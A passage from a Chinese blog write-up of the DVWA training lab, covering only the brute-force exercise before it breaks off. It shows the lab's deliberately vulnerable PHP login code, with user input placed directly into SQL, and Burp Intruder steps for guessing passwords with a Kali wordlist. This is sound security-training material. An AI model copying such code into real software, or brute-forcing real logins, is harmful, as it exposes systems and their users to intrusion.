<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>DVWA Writeup - EP`s blog</title><meta name=Description content="关于 LoveIt 主题"><meta property="og:title" content="DVWA Writeup"><meta property="og:description" content="复习一些web强身健体（不是 其中webshell部分的eval被我改成了evaltest，不然windows defender总报&helli"><meta property="og:type" content="article"><meta property="og:url" content="https://linkleyping.top/dvwa/"><meta property="og:image" content="https://linkleyping.top/logo.png"><meta property="article:published_time" content="2021-10-13T15:22:45+08:00"><meta property="article:modified_time" content="2022-04-02T20:47:48+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://linkleyping.top/logo.png"><meta name=twitter:title content="DVWA Writeup"><meta name=twitter:description content="复习一些web强身健体（不是 其中webshell部分的eval被我改成了evaltest，不然windows defender总报&helli"><meta name=application-name content="EP`s blog"><meta name=apple-mobile-web-app-title content="EP`s blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://linkleyping.top/dvwa/><link rel=prev href=https://linkleyping.top/gslab2021-final/><link rel=next href=https://linkleyping.top/bytectf2021-pre/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"DVWA Writeup","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/linkleyping.top\/dvwa\/"},"image":["https:\/\/linkleyping.top\/images\/Apple-Devices-Preview.png"],"genre":"posts","wordcount":9067,"url":"https:\/\/linkleyping.top\/dvwa\/","datePublished":"2021-10-13T15:22:45+08:00","dateModified":"2022-04-02T20:47:48+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"xxxx","logo":"https:\/\/linkleyping.top\/images\/avatar.png"},"author":{"@type":"Person","name":"EP"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':('auto'==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:'auto'==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="EP`s blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/icon.png data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x" data-sizes=auto alt=/images/icon.png title=/images/icon.png><span class=header-title-pre><i class="far fa-kiss-wink-heart fa-fw"></i></span>EP`s blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>所有文章 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/about/>关于 </a><a class=menu-item href=https://github.com/LinkleYping title=GitHub rel="noopener noreffer" target=_blank><i class="fab fa-github fa-fw"></i></a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span></span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="EP`s blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=/images/icon.png data-srcset="/images/icon.png, /images/icon.png 1.5x, /images/icon.png 2x" data-sizes=auto alt=/images/icon.png title=/images/icon.png><span class=header-title-pre><i class="far fa-kiss-wink-heart fa-fw"></i></span>EP`s blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/>所有文章</a><a class=menu-item href=/categories/>分类</a><a class=menu-item href=/about/>关于</a><a class=menu-item href=https://github.com/LinkleYping title=GitHub rel="noopener noreffer" target=_blank><i class="fab fa-github fa-fw"></i></a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">DVWA Writeup</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://linkleyping.top title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw"></i>EP</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/writeup/><i class="far fa-folder fa-fw"></i>writeup</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-10-13>2021-10-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 9067 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 19 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#环境>环境</a></li><li><a href=#brute-force>Brute Force</a><ul><li><a href=#low>low</a></li><li><a href=#medium>medium</a></li><li><a href=#high>high</a></li></ul></li><li><a href=#common-injection>Common Injection</a><ul><li><a href=#low-1>low</a></li><li><a href=#medium-1>medium</a></li><li><a href=#high-1>high</a></li></ul></li><li><a href=#csrf>CSRF</a><ul><li><a href=#low-2>low</a></li><li><a href=#medium-2>medium</a></li><li><a href=#high-2>high</a></li></ul></li><li><a href=#文件包含>文件包含</a><ul><li><a href=#文件包含与漏洞><strong>文件包含与漏洞</strong></a></li><li><a href=#文件包含漏洞用到的函数><strong>文件包含漏洞用到的函数</strong></a></li><li><a href=#目录遍历与文件包含的区别><strong>目录遍历与文件包含的区别</strong></a></li><li><a href=#文件包含特征><strong>文件包含特征</strong></a></li><li><a href=#检测方法><strong>检测方法</strong></a></li><li><a href=#low-3>low</a></li><li><a href=#medium-3>medium</a></li><li><a href=#high-3>high</a></li></ul></li><li><a href=#文件上传>文件上传</a><ul><li><a href=#low-4>low</a></li><li><a href=#medium-4>medium</a></li><li><a href=#high-4>high</a></li></ul></li><li><a href=#sql注入>SQL注入</a><ul><li><a href=#low-5>low</a></li><li><a href=#medium-5>medium</a></li><li><a href=#high-5>high</a></li></ul></li><li><a href=#sql盲注>SQL盲注</a><ul><li><a href=#low-6>low</a></li><li><a href=#medium-6>medium</a></li><li><a href=#high-6>high</a></li></ul></li><li><a href=#weak-session-ids>weak session ids</a></li><li><a href=#xssdom>XSS(DOM)</a><ul><li><a href=#dom树>DOM树</a></li><li><a href=#low-7>low</a></li><li><a href=#medium-7>medium</a></li><li><a href=#high-7>high</a></li></ul></li><li><a href=#xss-reflect>XSS Reflect</a><ul><li><a href=#low-8>low</a></li><li><a href=#medium-8>medium</a></li><li><a href=#high-8>high</a></li></ul></li><li><a href=#xss-stored>XSS Stored</a><ul><li><a href=#low-9>low</a></li></ul></li><li><a href=#csp-bypass>CSP bypass</a><ul><li><a href=#low-10>low</a></li><li><a href=#medium-9>medium</a></li><li><a href=#high-9>high</a></li></ul></li><li><a href=#javascript>JavaScript</a><ul><li><a href=#low-11>low</a></li><li><a href=#medium-10>medium</a></li><li><a href=#high-10>high</a></li></ul></li><li><a href=#参考链接>参考链接</a></li></ul></nav></div></div><div class=content id=content><p>复习一些web强身健体（不是</p><p>其中webshell部分的eval被我改成了evaltest，不然windows defender总报&mldr;</p><h2 id=环境>环境</h2><p><a href=https://github.com/ethicalhack3r/DVWA target=_blank rel="noopener noreffer">https://github.com/ethicalhack3r/DVWA</a></p><p>docker启动 <code>docker run --rm -it -p 80:80 vulnerables/web-dvwa</code></p><p>默认凭证: admin/password</p><p><a href=https://www.freebuf.com/articles/web/274058.html>https://www.freebuf.com/articles/web/274058.html</a></p><p>burp的四种攻击模式：https://blog.csdn.net/huilan_same/article/details/64440284</p><h2 id=brute-force>Brute Force</h2><h3 id=low>low</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;Login&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Get username  
</span><span class=c1></span>    <span class=nv>$user</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;username&#39;</span> <span class=p>];</span>  
  
    <span class=c1>// Get password  
</span><span class=c1></span>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;password&#39;</span> <span class=p>];</span>  
    <span class=nv>$pass</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>  
  
    <span class=c1>// Check the database  
</span><span class=c1></span>    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT * FROM `users` WHERE user = &#39;</span><span class=si>$user</span><span class=s2>&#39; AND password = &#39;</span><span class=si>$pass</span><span class=s2>&#39;;&#34;</span><span class=p>;</span>  
    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>  
  
    <span class=k>if</span><span class=p>(</span> <span class=nv>$result</span> <span class=o>&amp;&amp;</span> <span class=nx>mysqli_num_rows</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>  
        <span class=c1>// Get users details  
</span><span class=c1></span>        <span class=nv>$row</span>    <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>);</span>  
        <span class=nv>$avatar</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;avatar&#34;</span><span class=p>];</span>  
  
        <span class=c1>// Login successful  
</span><span class=c1></span>        <span class=k>echo</span> <span class=s2>&#34;&lt;p&gt;Welcome to the password protected area </span><span class=si>{</span><span class=nv>$user</span><span class=si>}</span><span class=s2>&lt;/p&gt;&#34;</span><span class=p>;</span>  
        <span class=k>echo</span> <span class=s2>&#34;&lt;img src=</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>{</span><span class=nv>$avatar</span><span class=p>}</span><span class=nx>\\</span><span class=s2>&#34; /&gt;&#34;</span><span class=p>;</span>  
    <span class=p>}</span>  
    <span class=k>else</span> <span class=p>{</span>  
        <span class=c1>// Login failed  
</span><span class=c1></span>        <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&#34;</span><span class=p>;</span>  
    <span class=p>}</span>  
  
    <span class=p>((</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])))</span> <span class=o>?</span> <span class=k>false</span> <span class=o>:</span> <span class=nv>$___mysqli_res</span><span class=p>);</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/1.png data-srcset="/images/dvwa/1.png, /images/dvwa/1.png 1.5x, /images/dvwa/1.png 2x" data-sizes=auto alt=/images/dvwa/1.png title=/images/dvwa/1.png></p><p>get请求中的username和password可以直接爆破</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/2.png data-srcset="/images/dvwa/2.png, /images/dvwa/2.png 1.5x, /images/dvwa/2.png 2x" data-sizes=auto alt=/images/dvwa/2.png title=/images/dvwa/2.png></p><p>将请求数据发送到 <code>Intruder</code> 模块进行暴力破解，爆破字典使用 Kali 内置的字典<code>/usr/share/wordlists/fasttrack.txt</code>,使用 <code>§</code> 符号标记需要测试的数据</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/3.png data-srcset="/images/dvwa/3.png, /images/dvwa/3.png 1.5x, /images/dvwa/3.png 2x" data-sizes=auto alt=/images/dvwa/3.png title=/images/dvwa/3.png></p><p>根据返回的数据长度推测爆破成功，即密码为 <code>password</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/4.png data-srcset="/images/dvwa/4.png, /images/dvwa/4.png 1.5x, /images/dvwa/4.png 2x" data-sizes=auto alt=/images/dvwa/4.png title=/images/dvwa/4.png></p><h3 id=medium>medium</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;Login&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Sanitise username input  
</span><span class=c1></span>    <span class=nv>$user</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;username&#39;</span> <span class=p>];</span>  
    <span class=nv>$user</span> <span class=o>=</span> <span class=p>((</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$user</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nx>trigger_error</span><span class=p>(</span><span class=s2>&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&#34;&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>));</span>  
  
    <span class=c1>// Sanitise password input  
</span><span class=c1></span>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;password&#39;</span> <span class=p>];</span>  
    <span class=nv>$pass</span> <span class=o>=</span> <span class=p>((</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$pass</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nx>trigger_error</span><span class=p>(</span><span class=s2>&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&#34;&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>));</span>  
    <span class=nv>$pass</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>  
  
    <span class=c1>// Check the database  
</span><span class=c1></span>    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT * FROM `users` WHERE user = &#39;</span><span class=si>$user</span><span class=s2>&#39; AND password = &#39;</span><span class=si>$pass</span><span class=s2>&#39;;&#34;</span><span class=p>;</span>  
    <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>  
  
    <span class=k>if</span><span class=p>(</span> <span class=nv>$result</span> <span class=o>&amp;&amp;</span> <span class=nx>mysqli_num_rows</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>)</span> <span class=p>{</span>  
        <span class=c1>// Get users details  
</span><span class=c1></span>        <span class=nv>$row</span>    <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>);</span>  
        <span class=nv>$avatar</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;avatar&#34;</span><span class=p>];</span>  
  
        <span class=c1>// Login successful  
</span><span class=c1></span>        <span class=k>echo</span> <span class=s2>&#34;&lt;p&gt;Welcome to the password protected area </span><span class=si>{</span><span class=nv>$user</span><span class=si>}</span><span class=s2>&lt;/p&gt;&#34;</span><span class=p>;</span>  
        <span class=k>echo</span> <span class=s2>&#34;&lt;img src=</span><span class=se>\\</span><span class=s2>&#34;</span><span class=p>{</span><span class=nv>$avatar</span><span class=p>}</span><span class=nx>\\</span><span class=s2>&#34; /&gt;&#34;</span><span class=p>;</span>  
    <span class=p>}</span>  
    <span class=k>else</span> <span class=p>{</span>  
        <span class=c1>// Login failed  
</span><span class=c1></span>        <span class=nx>sleep</span><span class=p>(</span> <span class=mi>2</span> <span class=p>);</span>  
        <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&#34;</span><span class=p>;</span>  
    <span class=p>}</span>  
  
    <span class=p>((</span><span class=nx>is_null</span><span class=p>(</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])))</span> <span class=o>?</span> <span class=k>false</span> <span class=o>:</span> <span class=nv>$___mysqli_res</span><span class=p>);</span>  
<span class=p>}</span>  
  
<span class=cp>?&gt;</span><span class=err>  
</span></code></pre></td></tr></table></div></div><p>对user和pass进行了过滤，使用了<code>mysql_real_escape_string</code>函数，会对字符串中的特殊字符进行转义，防止注入。而且在失败以后添加了sleep函数，爆破会慢一些，但是步骤不变。</p><h3 id=high>high</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>  
  
<span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;Login&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>  
    <span class=c1>// Check Anti-CSRF token  
</span><span class=c1></span>    <span class=nx>checkToken</span><span class=p>(</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;user_token&#39;</span> <span class=p>],</span> <span class=nv>$_SESSION</span><span class=p>[</span> <span class=s1>&#39;session_token&#39;</span> <span class=p>],</span> <span class=s1>&#39;index.php&#39;</span> <span class=p>);</span>  
  
    <span class=c1>// Sanitise username input  
</span><span class=c1></span>    <span class=nv>$user</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;username&#39;</span> <span class=p>];</span>  
    <span class=nv>$user</span> <span class=o>=</span> <span class=nx>stripslashes</span><span class=p>(</span> <span class=nv>$user</span> <span class=p>);</span>  
    <span class=nv>$user</span> <span class=o>=</span> <span class=p>((</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$user</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nx>trigger_error</span><span class=p>(</span><span class=s2>&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&#34;&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>));</span>  
  
    <span class=c1>// Sanitise password input  
</span><span class=c1></span>    <span class=nv>$pass</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span> <span class=s1>&#39;password&#39;</span> <span class=p>];</span>  
    <span class=nv>$pass</span> <span class=o>=</span> <span class=nx>stripslashes</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>  
    <span class=nv>$pass</span> <span class=o>=</span> <span class=p>((</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$pass</span> <span class=p>)</span> <span class=o>:</span> <span class=p>((</span><span class=nx>trigger_error</span><span class=p>(</span><span class=s2>&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;</span><span class=p>,</span> <span class=nx>E_USER_ERROR</span><span class=p>))</span> <span class=o>?</span> <span class=s2>&#34;&#34;</span> <span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>));</span>  
    <span class=nv>$pass</span> <span class=o>=</span> <span class=nx>md5</span><span class=p>(</span> <span class=nv>$pass</span> <span class=p>);</span>  
  
    <span class=c1>// Check database  
</span><span class=c1></span>    <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT * FROM `users` WHERE user = &#39;</span><span class=si>$user</span><span class=s2>&#39; AND password = &#39;</span><span class=si>$pass</span><span class=s2>&#39;;&#34;</span><span class=p>;</span>  
